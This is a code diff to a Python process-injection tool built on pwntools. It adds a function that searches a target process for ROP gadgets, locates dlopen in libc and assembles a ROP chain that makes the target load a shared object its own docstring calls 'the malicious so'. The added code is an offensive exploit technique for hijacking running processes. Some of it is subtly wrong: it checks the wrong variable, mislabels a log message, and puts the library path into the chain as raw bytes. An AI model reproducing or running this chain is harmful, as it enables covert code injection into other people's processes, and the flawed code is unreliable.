@@ -1,3 +1,4 @@
+import logging
 from ctypes import *
 
 from pwn import *
@@ -116,8 +117,8 @@ def find_gadget(pid: int, maps_entry: dict, gadget: bytes) -> int:
 
 def locate_dlopen(pid: int, libc_base: int) -> int:
     """
-    :param libc_base: base address of libc in the target process
     :param pid: id of the target process
+    :param libc_base: base address of libc in the target process
     :return: the final address of dlopen in the target process
     """
     libc = CDLL('libc.so.6')
@@ -133,17 +134,42 @@ def locate_dlopen(pid: int, libc_base: int) -> int:
         raise Exception("could not find libc base address in target process")
     offset = address - int(base, 16)
     final_addr = libc_base + offset
+    log.info(f"libc base: {hex(final_addr)}")
     return final_addr
 
 
-def dl_open_rop(pid: int, address, so_path):
+def dl_open_rop(pid: int, address: int, so_path: str, maps: dict):
     """
-    :param pid:
-    :param address:
-    :param so_path:
-    :return:
+    :param pid: id of the target process
+    :param address: target address
+    :param so_path: the path to the malicious so
+    :param maps: a parsed proc maps dict
+    :return: void
     """
 
+    for gadget in GADGET_LIST.keys():
+        log.info(f"finding: {gadget}")
+        for binary in maps["bin"]:
+            gadget_addr = find_gadget(pid=pid, maps_entry=binary, gadget=GADGET_LIST[gadget])
+            if address != -1:
+                if gadget == "return_addr":
+                    address = address + 2
+                log.success("found! => " + str(hex(address)))
+                GADGET_LIST[gadget] = gadget_addr.to_bytes(8, byteorder="little")
+                break
+
+    for binary in maps["bin"]:
+        if 'libc.so.6' in binary["name"]:
+            dlopen_addr = locate_dlopen(pid=pid, libc_base=binary["start"])
+            break
+    else:
+        print("[-] didn't find dlopen's address...")
+        exit(1)
+
+    rop_chain = GADGET_LIST["pop_rsi"] + p64(dlopen_addr) + GADGET_LIST["mov_rax_rsi"] + GADGET_LIST["pop_rsi"] + (
+        2).to_bytes(8, byteorder="little") + GADGET_LIST["pop_rdi"] + so_path.encode() + GADGET_LIST["jmp_rax"]
+
+    return rop_chain
 
 class SyscallInfo:
     def __init__(self, syscall_num, rdi, rsi, rdx, r10, r8, r9, rsp, rip):
